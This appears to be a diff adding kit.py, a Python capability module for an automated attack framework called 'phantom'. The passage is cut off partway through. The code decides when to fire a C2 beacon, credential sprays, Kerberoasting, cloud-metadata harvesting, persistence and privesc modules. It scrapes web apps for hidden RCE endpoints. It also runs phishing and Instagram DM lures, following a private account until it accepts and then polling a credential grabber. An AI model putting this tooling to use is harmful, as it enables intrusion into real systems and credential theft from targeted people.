@@ -1,0 +1,5177 @@
+"""
+kit.py — built-in capability library.
+
+Every adapter here is the ONLY place that knows how a tool's command
+line is built. Interpreters live in perception.py and are shared.
+"""
+
+from __future__ import annotations
+
+import os
+import re
+from typing import Any, Dict, List, Optional, Tuple
+
+from phantom.automation.belief import WorldModel, Finding
+from phantom.automation.external_intel import (
+    external_intel_engine, external_intel_interp,
+)
+from phantom.automation.phone_intel import (
+    phone_intel_engine, phone_intel_interp,
+)
+from phantom.automation.guidance.commands import Capability, InputSlot
+from phantom.automation.guidance.targets import split_host_port
+# Target/URL resolution lives in `target_kit` (2026-11-05): kit was the only
+# place it existed, in the middle of a 5.2k-line file. Re-exported here because
+# ~30 adapters below call these by name, and a top-level import means a broken
+# name is an import error instead of a runtime surprise.
+from phantom.automation.guidance.target_kit import (  # noqa: F401
+    _bare_host,
+    _effective_target,
+    _effective_url,
+    _external_intel_applicable,
+    _hport,
+    _resolve_target_address,
+)
+# P3: the generative fuzz engine (brain/fuzz) had no capability reaching it;
+# these are the adapter/interpreter/engine that register it below. Imported
+# at module level because the registry is a LITERAL (statements cannot live
+# between its entries).
+from phantom.automation.brain.fuzz.capability import (
+    fuzz_adapter as _fuzz_adapter, fuzz_engine as _fuzz_engine,
+    fuzz_interp as _fuzz_interp,
+)
+from phantom.automation.perception import (
+    parse_nmap_ports,
+    parse_nmap_os,
+    parse_http_banner,
+    detect_cms,
+    parse_smb_shares,
+    parse_redis_info,
+    parse_ssh_banner,
+)
+
+
+def _join_local_shell(cmds: List[str]) -> str:
+    """Join LOCAL probe segments with a separator this host's shell runs.
+
+    The adapters below build chains that `execute_quiet` runs on the
+    OPERATOR's box (subprocess `shell=True`). On Windows that shell is
+    cmd.exe, which has no `;` separator: it hands everything after the
+    first command to that command as arguments. A `;`-joined probe chain
+    therefore collapsed into a single `echo` and produced zero markers —
+    MEASURED on this box (2026-10-17): the curl_probe chain returned 66
+    bytes and `head: unknown option -- s` instead of 10 probe sections,
+    while the same chain joined with `&` returned all 10. `&` is cmd.exe's
+    sequential separator, so it is the exact equivalent; POSIX keeps `;`.
+    """
+    return (" & " if os.name == "nt" else " ; ").join(cmds)
+
+
+def _has_service(kind_service: str, port: str):
+    def _requires_service(wm: WorldModel) -> bool:
+        return wm.has(kind_service, port) if port else bool(wm.find("service"))
+    return _requires_service
+
+
+def _has_service_kind(kind_service: str, service_name: str):
+    """True when a service finding exists for ``service_name`` on ANY port
+    (SSH on 22, 2222, 22222 ...). Port-exact preconditions silently skip
+    non-standard management ports that labs and hardened hosts hide behind.
+
+    The closure carries ``_phantom_requires_service`` so the planner can tell
+    a service-SPECIFIC gate ("this needs an SSH service") from a generic
+    ``service`` fact: a scan can reveal an unknown service, but once the
+    target's services are known and none is the required one, the move is a
+    deterministic dead end rather than an optimistic step."""
+    def _requires_service(wm: WorldModel) -> bool:
+        for finding in wm.find(kind_service):
+            value = finding.value if isinstance(finding.value, dict) else {}
+            if str(value.get("service", "")).lower() == service_name:
+                return True
+        return False
+    _requires_service._phantom_requires_service = service_name
+    return _requires_service
+
+
+def _has_any_service(labels, requires: str):
+    """Like `_has_service_kind`, but the footprint may label the SAME service
+    in more than one way: nmap calls SMB ``microsoft-ds`` (445) or
+    ``netbios-ssn`` (139), and RDP ``ms-wbt-server``. One gate must cover all
+    of them, with the same planner-visible ``_phantom_requires_service``.
+    """
+    wanted = {str(l).lower() for l in labels}
+
+    def _requires_service(wm: WorldModel) -> bool:
+        for finding in wm.find("service"):
+            value = finding.value if isinstance(finding.value, dict) else {}
+            if str(value.get("service", "")).lower() in wanted:
+                return True
+        return False
+    _requires_service._phantom_requires_service = requires
+    return _requires_service
+
+
+_WEB_PORTS = {80, 443, 8080, 8081, 8443, 8000, 8888, 3000, 5000, 9090}
+
+# --- web target resolution: discovery-driven, not port-guessed -----------
+# The hardened-target simulation showed the web chain aiming at port 80 on a
+# box whose ONLY web surface is on 8443 (self-signed TLS), so `http_probe`
+# "could not reach" the app the scan had just discovered. A discovered web
+# service is the app we mean; guessing 80 is only the last resort.
+_NON_DEFAULT_HTTPS = {443, 8443, 9443, 10443}
+
+
+def _local_addresses() -> set:
+    """Addresses that mean "this box" (the operator's own machine)."""
+    out = {"", "localhost", "127.0.0.1", "::1", "0.0.0.0"}
+    try:
+        import socket
+        out.add(str(socket.gethostbyname(socket.gethostname())))
+    except Exception:
+        pass
+    return out
+
+
+def _c2_port_blocks(host: str) -> str:
+    """Our C2 listener port, but ONLY when the target IS this box.
+
+    Fuzzing/probing our own listener is absurd, so the rule exists — but it
+    was applied to every target, which made the chosen web port depend on
+    the operator's own configuration: a remote app on 8080 was skipped just
+    because the local C2 happened to listen on 8080.
+    """
+    if (host or "").strip().lower() not in _local_addresses():
+        return ""
+    try:
+        from phantom.utils.network import get_c2_endpoint
+        return str(get_c2_endpoint()[1])
+    except Exception:
+        return ""
+
+
+def _discovered_web_port(wm: WorldModel) -> str:
+    """The port of the web app the scan actually found, or "".
+
+    Preference: a fingerprinted `web_app` port, then a service whose label
+    says http/https (bare or as the wrapped protocol of `ssl/http`) on any
+    port, then a service on a well-known web port. NEVER a port we only
+    assume, and never our own listener on a local target.
+    """
+    try:
+        services = list(wm.find("service"))
+    except Exception:
+        services = []
+    app_ports = []
+    for f in wm.find("web_app"):
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", ""))
+        if p and p not in app_ports:
+            app_ports.append(p)
+    host = _effective_target(wm)
+    blocked = _c2_port_blocks(host)
+    for port in app_ports:
+        if port != blocked:
+            return port
+    for f in services:
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", "") or "")
+        if not p or p == blocked:
+            continue
+        label = str(v.get("service", "")).lower()
+        proto = label.rsplit("/", 1)[-1] if "/" in label else label
+        if proto in ("http", "https", "http-alt", "www") \
+                or proto.startswith("http") or "web" in proto:
+            return p
+    for f in services:
+        v = f.value if isinstance(f.value, dict) else {}
+        p = str(v.get("port", "") or "")
+        if p and p != blocked and p.isdigit() and int(p) in _WEB_PORTS:
+            return p
+    return ""
+
+
+def _web_scheme(wm: WorldModel, port: str) -> str:
+    """https when the port or the service label says TLS, else http."""
+    try:
+        port_i = int(port)
+    except (TypeError, ValueError):
+        port_i = 0
+    if port_i in _NON_DEFAULT_HTTPS:
+        return "https"
+    try:
+        for f in wm.find("service"):
+            v = f.value if isinstance(f.value, dict) else {}
+            if str(v.get("port", "")) == str(port):
+                label = str(v.get("service", "")).lower()
+                if label.startswith("ssl") or "https" in label \
+                        or label.endswith("/http") and label.startswith("ssl"):
+                    return "https"
+    except Exception:
+        pass
+    return "https" if port_i == 443 else "http"
+
+
+def _preferred_url(wm: WorldModel) -> str:
+    """`_effective_url`, but pointed at the DISCOVERED web app.
+
+    A URL target keeps its own scheme/port/path (the operator was explicit).
+    A bare host with a discovered web service on a non-default port is
+    re-pointed at it: the app the scan found is the app HTTP tooling means.
+    """
+    raw = (_resolve_target_address(wm) or "").strip()
+    if "://" in raw:
+        return _effective_url(wm)
+    port = _discovered_web_port(wm)
+    host = _bare_host(raw)
+    if not host or not port or port in ("80", "443"):
+        return _effective_url(wm)
+    return f"{_web_scheme(wm, port)}://{host}:{port}"
+
+
+# Attribute -> served path. ONE page/script, parsed for the routes it names:
+# the app's own links are the cheapest honest wordlist (the hardened target
+# leaked its hidden RCE path as <script src="/internal/v2/_dash.js">).
+_WEB_PATH_ATTR_RE = re.compile(
+    r"(?:src|href|action|data-url|data-endpoint|data-api)\s*=\s*[\"']"
+    r"([^\"'<>\s]{2,180})[\"']", re.I)
+_DEFAULT_UPLOAD_PATHS = ("/upload",)
+
+# A hardened app hides its upload/API handler in a script rather than in an
+# <a href>. The attribute regex above cannot see `const api='/x/y'`, so the
+# RCE probe also reads quoted absolute paths from HTML and JS.
+_QUOTED_PATH_RE = re.compile(
+    r"""["'](/[A-Za-z0-9_./~-]{2,180})["']""")
+_STATIC_SUFFIXES = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
+                    ".ico", ".woff", ".woff2", ".map", ".json", ".txt")
+
+
+def _candidate_quoted_paths(body: str, limit: int = 12):
+    """Absolute paths quoted inside HTML/JS (handlers, fetch() endpoints)."""
+    out = []
+    if not isinstance(body, str):
+        return out
+    for m in _QUOTED_PATH_RE.finditer(body[:200000]):
+        path = m.group(1).strip()
+        if not path or path.startswith("//"):
+            continue
+        path = path.split("?", 1)[0].split("#", 1)[0]
+        if len(path) < 2 or len(path) > 180 or path in out:
+            continue
+        out.append(path)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _probeable_paths(paths, limit: int = 6):
+    """Drop assets that cannot be an upload/API handler, keep order."""
+    out = []
+    for path in paths or []:
+        if not isinstance(path, str) or not path.startswith("/"):
+            continue
+        if path.lower().endswith(_STATIC_SUFFIXES) or path in out:
+            continue
+        out.append(path)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _discover_web_paths(base: str):
+    """Paths the app's own HTML/JS references, fetched with a small budget.
+
+    The hardened lab only exposes its RCE endpoint as
+    `const api='/internal/v2/report/run'` in a script: no form, no link, and
+    `/upload` answers 403. Probing only the conventional path reported "no
+    RCE" on a box that executes uploads. Returns [] on any failure; the
+    conventional defaults still run afterwards.
+    """
+    import ssl
+    import urllib.request
+
+    if not base:
+        return []
+    context = ssl._create_unverified_context()
+
+    def fetch(path: str) -> str:
+        try:
+            req = urllib.request.Request(
+                base + path, headers={"User-Agent": "Mozilla/5.0 Phantom"})
+            with urllib.request.urlopen(req, timeout=2.5,
+                                        context=context) as resp:
+                return resp.read(160000).decode("utf-8", "replace")
+        except Exception:
+            return ""
+
+    home = fetch("/")
+    if not home:
+        return []
+    found = [path for path, _ in _candidate_web_paths(home)]
+    found += _candidate_quoted_paths(home)
+    scripts = [path for path in dict.fromkeys(found)
+               if path.lower().endswith(".js")][:3]
+    for script in scripts:
+        body = fetch(script)
+        found += [path for path, _ in _candidate_web_paths(body)]
+        found += _candidate_quoted_paths(body)
+    return list(dict.fromkeys(found))
+
+
+def _candidate_web_paths(body: str, limit: int = 8):
+    """[(path, evidence)] for the paths this document/script references.
+
+    Deterministic, bounded, dedupe-by-path. Both the raw reference and the
+    extension-less sibling are kept (`/x/dash.js` -> `/x/dash`) because an
+    upload handler is as likely to be addressed with or without the suffix.
+    """
+    import re as _re
+    out = []
+    seen = set()
+    if not isinstance(body, str):
+        return out
+    for m in _WEB_PATH_ATTR_RE.finditer(body[:200000]):
+        ref = m.group(1).strip()
+        if not ref or ref.startswith(("data:", "javascript:", "mailto:", "#")):
+            continue
+        if ref.startswith("http") or "://" in ref:
+            try:
+                from urllib.parse import urlsplit
+                parts = urlsplit(ref)
+                ref = parts.path or ""
+            except ValueError:
+                continue
+        if not ref.startswith("/"):
+            continue
+        ref = ref.split("?", 1)[0].split("#", 1)[0]
+        if not ref or ref == "/":
+            continue
+        variants = [ref]
+        for suffix in (".js", ".css", ".json", ".html"):
+            if ref.lower().endswith(suffix) and len(ref) > len(suffix) + 1:
+                variants.append(ref[: -len(suffix)])
+        for candidate in variants:
+            if len(candidate) > 180 or candidate in seen:
+                continue
+            seen.add(candidate)
+            out.append((candidate, f"referenced by the app: {m.group(0)[:120]}"))
+            if len(out) >= limit:
+                return out
+    return out
+
+
+def _has_web_service():
+    """True when the scan found a web-capable service: an http/https label
+    (bare or as the wrapped protocol of a TLS token, ``ssl/http``) on ANY
+    port, any ``http*``/``web`` label, or a service on a well-known web port.
+
+    A bare ``ssl`` label is deliberately NOT web: nmap prints ``ssl/<proto>``
+    for every TLS-wrapped service (``ssl/ldap`` on 636, ``ssl/smtp`` on 465,
+    ``ssl/imap`` on 993). Accepting ``ssl`` alone marked ``web_creds`` /
+    ``web_rce`` as READY on a bare directory server, so the planner spent the
+    credential path on a surface that carries no web app at all."""
+    def _requires_web(wm: WorldModel) -> bool:
+        for finding in wm.find("service"):
+            value = finding.value if isinstance(finding.value, dict) else {}
+            service = str(value.get("service", "")).lower()
+            try:
+                port = int(value.get("port", 0))
+            except (TypeError, ValueError):
+                port = 0
+            # composite TLS token: the WRAPPED protocol decides, not the
+            # `ssl` wrapper
+            proto = service.rsplit("/", 1)[-1] if "/" in service else service
+            if proto in ("http", "https", "http-alt", "www"):
+                return True
+            if proto.startswith("http") or "web" in proto:
+                return True
+            if port in _WEB_PORTS:
+                return True
+        return False
+    return _requires_web
+
+
+def _has_creds():
+    def _requires_creds(wm: WorldModel) -> bool:
+        return bool(wm.find("creds", valid=True))
+    return _requires_creds
+
+
+def _has_any_creds_or_accounts():
+    """True when we hold ANY credential material (valid or not) or know
+    account names — the minimum input for a lockout-aware spray."""
+    def _requires_material(wm: WorldModel) -> bool:
+        if wm.find("creds"):
+            return True
+        for kind in ("osint_identity", "email", "user"):
+            if wm.find(kind):
+                return True
+        return False
+    return _requires_material
+
+
+def _has_beacon():
+    def _requires_beacon(wm: WorldModel) -> bool:
+        return bool(wm.find("beacon"))
+    return _requires_beacon
+
+
+def _has_env_container():
+    """True when the environment probe flagged a container/cloud/VM box
+    (the vantage from which metadata harvesting is meaningful)."""
+    def _requires_env(wm: WorldModel) -> bool:
+        for f in wm.find("environment"):
+            v = f.value if isinstance(f.value, dict) else {}
+            kinds = v.get("kinds") or []
+            labels = [str(k.get("kind", "")) for k in kinds] if kinds else []
+            if any(x in labels for x in ("container", "kubernetes", "cloud")):
+                return True
+        return True  # metadata harvest is safe to try on any beacon box
+    return _requires_env
+
+
+def _has_cloud_creds():
+    """True when cloud identity material (AWS/GCP/Azure) was captured."""
+    def _requires_cloud(wm: WorldModel) -> bool:
+        if wm.find("cloud_creds"):
+            return True
+        for f in wm.find("creds"):
+            v = f.value if isinstance(f.value, dict) else {}
+            if str(v.get("service", "")) in ("aws", "gcp", "azure", "cloud"):
+                return True
+        return False
+    return _requires_cloud
+
+
+def _has_system_privilege():
+    def _requires_system_privilege(wm: WorldModel) -> bool:
+        return bool(wm.find("system_privilege"))
+    return _requires_system_privilege
+
+
+def _has_ad_domain():
+    def _requires_ad_domain(wm: WorldModel) -> bool:
+        return bool(wm.find("ad_domain"))
+    return _requires_ad_domain
+
+
+def _has_ad_service():
+    """An Active Directory surface is reachable: the scan saw LDAP/Kerberos
+    ports (88/389/636/3268/3269), a service name hinting ldap/kerberos/
+    domain, or the domain is already known. This is what lets the AD chain
+    (ad_enum → kerberoast/as_rep → hash_crack) run DIRECTLY from the
+    operator — no beacon foothold required."""
+    _AD_PORTS = {"88", "389", "636", "3268", "3269"}
+
+    def _requires_ad_service(wm: WorldModel) -> bool:
+        if wm.has_any("ad_domain"):
+            return True
+        # a beacon on a domain-joined box can enumerate AD from inside even
+        # when the operator's scan did not see the LDAP/Kerberos ports
+        if wm.has_any("beacon"):
+            return True
+        for f in wm.find("service"):
+            v = f.value if isinstance(f.value, dict) else {}
+            port = str(v.get("port", ""))
+            svc = str(v.get("service", "")).lower()
+            if port in _AD_PORTS:
+                return True
+            if any(k in svc for k in ("ldap", "kerberos", "kpasswd", "domain")):
+                return True
+        return False
+    return _requires_ad_service
+
+
+def _has_ad_hash():
+    def _requires_ad_hash(wm: WorldModel) -> bool:
+        return any(f.value.get("hash") for f in wm.find("ad_creds"))
+    return _requires_ad_hash
+
+
+def _has_ip():
+    def _requires_ip(wm: WorldModel) -> bool:
+        return bool(wm.target)
+    return _requires_ip
+
+
+def _has_target_type(*types):
+    """Precondition: the engagement target is one of the given types."""
+    def _requires_type(wm: WorldModel) -> bool:
+        return wm.target_type in types
+    return _requires_type
+
+
+def _has_phone_number():
+    """Precondition: a phone number is available to enrich — the
+    engagement target IS a phone, or a breach/identity finding surfaced a
+    number for this identity."""
+    def _requires_phone(wm: WorldModel) -> bool:
+        if getattr(wm, "target_type", "") == "phone":
+            return True
+        for kind in ("phone", "identity"):
+            for finding in wm.find(kind):
+                value = finding.value if isinstance(finding.value, dict) else {}
+                if value.get("phone") or value.get("e164"):
+                    return True
+        return False
+    return _requires_phone
+
+
+def _has_finding(kind: str):
+    def _requires_finding(wm: WorldModel) -> bool:
+        return bool(wm.find(kind))
+    return _requires_finding
+
+
+def _real_profiles(wm: WorldModel) -> list:
+    """Profile findings that stand for an EXISTING account.
+
+    A probe that came back `missing` is a fact about the PROBE ("we looked
+    here and found nothing"), and so is `unknown` ("the platform answered with
+    a page we cannot read"): neither is a profile. `find("profile")` cannot
+    tell them apart, so every profile gate was satisfied by an absence — auto
+    mode could plan a follow request at an account that does not exist. Live
+    evidence (2026-10-16): an email address probed as an instagram handle came
+    back `state=missing`, and seven variant handles came back `unknown` from
+    Instagram's universal app shell.
+    """
+    out = []
+    for f in wm.find("profile") or []:
+        v = f.value if isinstance(f.value, dict) else {}
+        if str(v.get("state", "") or "") in ("missing", "unknown"):
+            continue
+        out.append(f)
+    return out
+
+
+def _has_real_profile():
+    def _requires_profile(wm: WorldModel) -> bool:
+        return bool(_real_profiles(wm))
+    return _requires_profile
+
+
+def _has_sent_lure():
+    """A lure was delivered: a phish (email/SMS) OR a DM. Both converge on
+    the same grabber, so poll/harvest accept either channel."""
+    def _requires_lure(wm: WorldModel) -> bool:
+        return bool(wm.find("phish") or wm.find("dm_sent"))
+    return _requires_lure
+
+
+def _not_profile_known():
+    """No social profile was mapped yet. Keeps the single-shot grabber poll
+    for plain email/SMS phish flows, while profile-based flows (Instagram
+    handle known, DM path) go through harvest_campaign — the campaign poll
+    that also catches opens/credentials and powers the cadence wait."""
+    def _requires_no_profile(wm: WorldModel) -> bool:
+        return not bool(_real_profiles(wm))
+    return _requires_no_profile
+
+
+def _harvest_flow():
+    """The campaign-harvest wait (chunked sleep + cadence) is the poll of
+    choice for SOCIAL flows — a known profile / DM path, or handle/phone
+    targets (username/phone). Plain email-only targets without a profile
+    keep the quick single-shot grabber poll instead."""
+    def _requires_social(wm: WorldModel) -> bool:
+        if _real_profiles(wm):
+            return True
+        return getattr(wm, "target_type", "") in ("username", "phone")
+    return _requires_social
+
+
+def _private_profile(wm: WorldModel) -> bool:
+    """True when profile_recon proved the target account is private."""
+    for f in _real_profiles(wm):
+        if f.value.get("private"):
+            return True
+    return False
+
+
+def _dm_ready():
+    """DM delivery gate: on a private account the follow must be accepted
+    first (the target accepted our follow request); public accounts are
+    DM-able as soon as an identity exists."""
+    def _requires_dm_ready(wm: WorldModel) -> bool:
+        if not wm.find("identity"):
+            return False
+        if _private_profile(wm):
+            return bool(wm.find("follow_accepted"))
+        return True
+    return _requires_dm_ready
+
+
+def _not_private_profile():
+    """Email lures are gated OFF for private accounts: the natural path for
+    a private profile is follow -> wait -> DM (never an unsolicited email
+    that the account state makes implausible)."""
+    def _requires_public(wm: WorldModel) -> bool:
+        return not _private_profile(wm)
+    return _requires_public
+
+
+# Branch-aware tool needs for the social channel. These capabilities
+# shell out per target TYPE (username -> sherlock, email -> theHarvester,
+# phone -> offline phonenumbers lib), so a static `tools` list would lie:
+# it would block the email path for a missing sherlock nobody calls.
+# The agent resolves these at execution for the CURRENT target type and
+# emits an honest tool_missing (with install hints downstream) instead
+# of running into an opaque runtime failure.
+_SOCIAL_TOOLS = {
+    "osint_identity": {"username": ["sherlock"],
+                       "email": ["theHarvester"],
+                       "phone": []},
+    "profile_recon": {"username": ["sherlock"],
+                      "email": ["sherlock"],
+                      "phone": []},
+    "breach_check": {"username": [], "email": [], "phone": []},
+    "email_candidates": {"username": [], "email": [], "phone": []},
+    "breach_correlate": {"username": [], "email": [], "phone": []},
+    "reset_enum": {"username": [], "email": [], "phone": []},
+    "email_verify": {"username": [], "email": [], "phone": []},
+}
+
+
+def social_tools_for(capability_id: str, target_type: str) -> List[str]:
+    """Binaries the social channel needs for this capability on this
+    target type (empty = nothing external: offline libs / curl)."""
+    return list(_SOCIAL_TOOLS.get(capability_id, {}).get(target_type, []))
+
+
+def _has_network_host():
+    """Precondition: a real machine to aim network tooling at.
+
+    Network targets (ip/domain/url) qualify as-is; identity targets
+    (email/username/phone) qualify only once OSINT + phish produced a
+    victim_ip. This is the convergence gate of the identity chain: the
+    network kill chain cannot start before the identity target became a
+    reachable host.
+    """
+    def _requires_network_host(wm: WorldModel) -> bool:
+        if wm.target_type in ("ip", "domain", "url"):
+            return True
+        return bool(wm.find("victim_ip"))
+    return _requires_network_host
+
+
+# ── target / URL resolution ────────────────────────────────────────────────
+# Moved to `target_kit` on 2026-11-05 and re-exported at the top of this file:
+# the six functions were a self-contained cluster that every adapter calls, and
+# they were the main reason a 5.2k-line module had to be read in full.
+
+
+def best_origin(wm: WorldModel):
+    """The most credible origin behind an edge, or None.
+
+    Only candidates above `ORIGIN_MIN_CONFIDENCE` count: below that we have
+    a naming guess, and aiming an engagement at a guess is worse than
+    waiting for the next discovery pass.
+    """
+    from phantom.automation.brain.edge import (ORIGIN_FACT,
+                                               ORIGIN_MIN_CONFIDENCE)
+    best, best_conf = "", 0.0
+    try:
+        findings = wm.find(ORIGIN_FACT)
+    except Exception:
+        return None
+    for f in findings:
+        v = f.value if isinstance(f.value, dict) else {}
+        try:
+            conf = float(v.get("confidence", 0) or 0)
+        except (TypeError, ValueError):
+            continue
+        if conf < ORIGIN_MIN_CONFIDENCE:
+            continue
+        host = str(v.get("host", "") or v.get("ip", "") or "")
+        if host and conf > best_conf:
+            best, best_conf = host, conf
+    return best or None
+
+
+def edge_of(wm: WorldModel):
+    """The EDGE finding that applies to the address in scope, or None."""
+    from phantom.automation.brain.edge import EDGE_FACT, EDGE_THRESHOLD
+    try:
+        findings = wm.find(EDGE_FACT)
+    except Exception:
+        return None
+    target = str(getattr(wm, "target", "") or "")
+    for f in findings:
+        v = f.value if isinstance(f.value, dict) else {}
+        if not v.get("is_edge"):
+            continue
+        try:
+            if float(v.get("confidence", 0) or 0) < EDGE_THRESHOLD:
+                continue
+        except (TypeError, ValueError):
+            continue
+        addr = str(v.get("address", "") or "")
+        if addr and target and addr != target:
+            continue
+        return v
+    return None
+
+
+def _beacon_payload(wm: WorldModel) -> str:
+    """The exact beacon command that established the current session."""
+    b = wm.find("beacon")
+    if not b:
+        raise ValueError("no beacon session established")
+    return b[0].value.get("payload", "true")
+
+
+def _target_os(wm: WorldModel) -> str:
+    """The target OS name: confirmed `os` finding first (its value carries
+    `name` from nmap -O), then the reasoning engine's `os_inferred`.
+    Returns "" when neither exists so callers can fall back safely."""
+    for kind in ("os", "os_inferred"):
+        os_f = wm.find(kind)
+        if not os_f:
+            continue
+        value = os_f[0].value if isinstance(os_f[0].value, dict) else {}
+        name = value.get("os") or value.get("name") or ""
+        if name:
+            return str(name)
+    return ""
+
+
+def _ad_domain(wm: WorldModel) -> str:
+    f = wm.find("ad_domain")
+    return str(f[0].value.get("domain", "")) if f else ""
+
+
+def _ad_dc(wm: WorldModel) -> str:
+    """The domain controller to aim AD attacks at: the DC resolved by
+    ad_enum, falling back to the compromised target host when unresolved."""
+    f = wm.find("ad_domain")
+    if f and isinstance(f[0].value, dict):
+        dc = f[0].value.get("dc_host", "")
+        if dc:
+            return str(dc)
+    return wm.target
+
+
+def _origin_interp(output: str, wm: WorldModel,
+                   slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter for the origin-discovery engine: `EDGE:` and `ORIGIN:`
+    marker lines become typed facts the rest of the chain reasons about.
+
+    `edge` is the GATE fact ("this address is a provider's proxy"), `origin`
+    is the RESOLUTION fact ("the machine behind it is here"). Keeping them
+    separate is what lets the guard say "blocked: edge, no origin yet"
+    instead of having to guess from one overloaded flag.
+    """
+    from phantom.automation.brain.edge import EDGE_FACT, ORIGIN_FACT
+
+    def _num(raw: Any, default: float = 0.0) -> float:
+        try:
+            return float(str(raw).strip())
+        except (TypeError, ValueError):
+            return default
+
+    findings: List[Finding] = []
+    for line in (output or "").splitlines():
+        kv = _parse_marker_line(line, "EDGE:")
+        if kv.get("address"):
+            address = kv.get("address", "")
+            if address == "-":
+                address = wm.target
+            conf = _num(kv.get("confidence"))
+            findings.append(Finding(
+                kind=EDGE_FACT, key=f"edge:{address}",
+                value={"address": address,
+                       "provider": kv.get("provider", ""),
+                       "confidence": conf,
+                       "is_edge": str(kv.get("is_edge", "")).lower() == "true",
+                       "evidence": [e for e in
+                                    str(kv.get("evidence", "")).split("|") if e]},
+                confidence=max(0.2, conf), source="origin_discovery",
+                target=wm.target))
+            continue
+        kv = _parse_marker_line(line, "ORIGIN:")
+        host = kv.get("host", "")
+        if host and host != "-":
+            conf = _num(kv.get("confidence"))
+            ip = kv.get("ip", "")
+            findings.append(Finding(
+                kind=ORIGIN_FACT, key=f"origin:{host}",
+                value={"host": host, "ip": "" if ip == "-" else ip,
+                       "reason": kv.get("reason", ""),
+                       "confidence": conf},
+                confidence=max(0.2, conf), source="origin_discovery",
+                target=wm.target))
+    return findings
+
+
+def _mk_slot(name: str, typ: str, required: bool = True, desc: str = "") -> InputSlot:
+    return InputSlot(name=name, type=typ, required=required, description=desc)
+
+
+def _mk(cap_id: str, category: str, desc: str, inputs: List[InputSlot],
+        effects: List[str], adapter, interpreter=None, opsec_cost: float = 1.0,
+        detection_risk: float = 0.1, stealth_level: str = "passive",
+        forceful: bool = False, timeout: int = 30, preconditions: List = None,
+        banner: str = "", tools: List[str] = None,
+        exec_class: str = "shell_command", requires: List[str] = None,
+        engine=None) -> Capability:
+    # P2-1: marker adapters are AUTO-classified — the honest stubs can
+    # never masquerade as shell capabilities because the classification
+    # is derived from the adapter's own return marker, not from a hand-set
+    # tag someone might forget to update.
+    if exec_class == "shell_command":
+        import inspect as _inspect
+        try:
+            src = _inspect.getsource(adapter)
+            if "://" in src and "return f\"" in src and "marker" in src.lower():
+                exec_class = "marker_only"
+        except (OSError, TypeError):
+            pass
+    return Capability(
+        id=cap_id, category=category, description=desc, inputs=inputs,
+        effects=effects, adapter=adapter, interpreter=interpreter,
+        opsec_cost=opsec_cost, detection_risk=detection_risk,
+        stealth_level=stealth_level, forceful=forceful, timeout=timeout,
+        preconditions=preconditions or [], banner=banner or desc,
+        tools=tools or [], exec_class=exec_class, engine=engine,
+        requires=list(requires or []))
+
+
+def _interp_nmap_ports(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    return [Finding(**f, target=wm.target) for f in parse_nmap_ports(output)]
+
+
+def _interp_nmap_os(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    return [Finding(**f, target=wm.target) for f in parse_nmap_os(output)]
+
+
+def _header_map(raw: str) -> Dict[str, str]:
+    """Every `Name: value` pair of a raw HTTP response, lower-cased keys.
+
+    Used for EDGE detection: a CDN does not announce itself in `Server`
+    alone — `cf-ray`, `x-amz-cf-id`, `x-iinfo`, `x-served-by` are the
+    decisive ones, and they were being thrown away.
+    """
+    out: Dict[str, str] = {}
+    for line in (raw or "").splitlines():
+        if ":" not in line or line.lstrip().startswith("<"):
+            continue
+        name, _, value = line.partition(":")
+        name = name.strip()
+        if not name or len(name) > 40 or " " in name:
+            continue
+        out.setdefault(name.lower(), value.strip())
+    return out
+
+
+def _interp_http(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    findings = [Finding(**f, target=wm.target) for f in parse_http_banner(output)]
+    cms = detect_cms(output)
+    if cms:
+        findings.append(Finding(**cms, target=wm.target))
+    if findings and not wm.find("service"):
+        # URL bootstrap: a host that answers HTTP *has* a web service.
+        # Without this derived fact the whole web chain (web_rce, hunt,
+        # exploit) waits for an nmap scan that may never run (no nmap on
+        # the box) — the observed "URL spins forever finding nothing".
+        # Confidence stays below a real scan; nmap findings (same key)
+        # overwrite this the moment they exist.
+        from urllib.parse import urlsplit
+        raw_url = str(slots.get("url") or "")
+        try:
+            parts = urlsplit(raw_url or "http://%s" % _effective_target(wm))
+            scheme = (parts.scheme or "http").lower()
+            port = parts.port or (443 if scheme == "https" else 80)
+        except ValueError:
+            scheme, port = "http", 80
+        label = "https" if port == 443 or scheme == "https" else "http"
+        findings.append(Finding(
+            kind="service", key="tcp/%d" % port,
+            value={"port": str(port), "service": label,
+                   "derived": "http_probe"},
+            confidence=0.6, source="http_probe", target=wm.target))
+    # EDGE detection rides on the HTTP probe: the headers are already in
+    # hand, and knowing "this is Cloudflare, not the customer" changes what
+    # the rest of the chain is allowed to touch.
+    try:
+        from phantom.automation.brain.edge import EDGE_FACT, detect
+        verdict = detect(address=_effective_target(wm),
+                         headers=_header_map(output))
+        if verdict.is_edge:
+            findings.append(Finding(
+                kind=EDGE_FACT, key=f"edge:{_effective_target(wm)}",
+                value={"address": _effective_target(wm),
+                       "provider": verdict.provider,
+                       "confidence": verdict.confidence,
+                       "is_edge": True,
+                       "evidence": list(verdict.evidence)},
+                confidence=verdict.confidence, source="http_probe",
+                target=wm.target))
+    except Exception:
+        pass
+    return findings
+
+
+def _interp_smb(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    return [Finding(**f, target=wm.target) for f in parse_smb_shares(output)]
+
+
+def _interp_redis(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    return [Finding(**f, target=wm.target) for f in parse_redis_info(output)]
+
+
+def _interp_ssh_banner(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    f = parse_ssh_banner(output)
+    return [Finding(**f, target=wm.target)] if f else []
+
+
+def _interp_from(func_name: str):
+    """Lazy interpreter binding for post-exploitation modules.
+
+    Imported at interpretation time so the post package stays optional
+    until a beacon session actually exists.
+    """
+    _MODULES = {
+        "persistence_interpreter": "phantom.automation.post.persistence",
+        "privesc_interpreter": "phantom.automation.post.privesc",
+        "inject_interpreter": "phantom.automation.post.inject",
+        "ad_enum_interpreter": "phantom.automation.post.ad",
+        "kerberoast_interpreter": "phantom.automation.post.ad",
+        "as_rep_interpreter": "phantom.automation.post.ad",
